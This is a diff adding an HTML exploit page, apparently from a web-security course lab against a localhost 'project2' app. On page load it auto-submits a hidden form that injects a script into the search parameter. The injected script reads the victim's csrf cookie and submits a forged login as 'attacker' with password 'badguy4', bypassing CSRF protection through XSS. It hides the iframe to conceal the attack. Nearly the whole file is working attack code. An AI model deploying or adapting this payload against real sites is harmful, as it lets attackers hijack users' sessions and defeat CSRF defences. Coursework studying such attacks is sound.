@@ -1,0 +1,46 @@
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+<form name="CSRF1" id="formal" target="hiddeniframe" method="get" action="http://localhost/project2/search">
+    <input type="hidden" name="q" value="">
+    <input type="hidden" name="xssdefense" value="0">
+    <input type="hidden" name="csrfdefense" value="1">
+</form>
+
+<iframe name="hiddeniframe" style= "width:2000px; height: 2000px"></iframe>
+
+<script>
+    $(document).ready(function () {
+
+        var payload = "<script> var csrf_cookie = document.cookie.split('; ').find(row => row.startsWith('csrf=')).split('=')[1];" + 
+  "var form = document.createElement('form'); form.setAttribute('name', 'CSRF'); form.setAttribute('method', 'POST'); form.setAttribute('target', 'hiddeniframe');" +
+  "form.setAttribute('action', 'http://localhost/project2/login?csrfdefense=1&xssdefense=0');var inputUsername = document.createElement('input'); " +
+  "inputUsername.setAttribute('type', 'hidden');inputUsername.setAttribute('name', 'username');inputUsername.setAttribute('value', 'attacker');" + 
+  "var inputPassword = document.createElement('input');inputPassword.setAttribute('type', 'hidden');inputPassword.setAttribute('name', 'password'); " + 
+  "inputPassword.setAttribute('value', 'badguy4');var inputCsrf = document.createElement('input');inputCsrf.setAttribute('type', 'hidden'); " + 
+  "inputCsrf.setAttribute('name', 'csrf');inputCsrf.setAttribute('value', csrf_cookie);form.appendChild(inputUsername); form.appendChild(inputPassword); " + 
+  "form.appendChild(inputCsrf); document.body.appendChild(form);var iframe = document.createElement('iframe'); iframe.setAttribute('name', 'hiddeniframe'); " + 
+  "document.body.appendChild(iframe); form.submit(); <" + 
+  "/script>";
+  //Since backslash is an escape character, I made sure to add the end of the sript tag like this
+
+        $("input[name=q]").val(payload);
+
+        //Submit the form
+        CSRF1.submit()
+
+        //Hide the iframe 
+        $("iframe[name=hiddeniframe]").hide();
+    });
+
+</script>
+
+
+
+
+
+
+
+
+
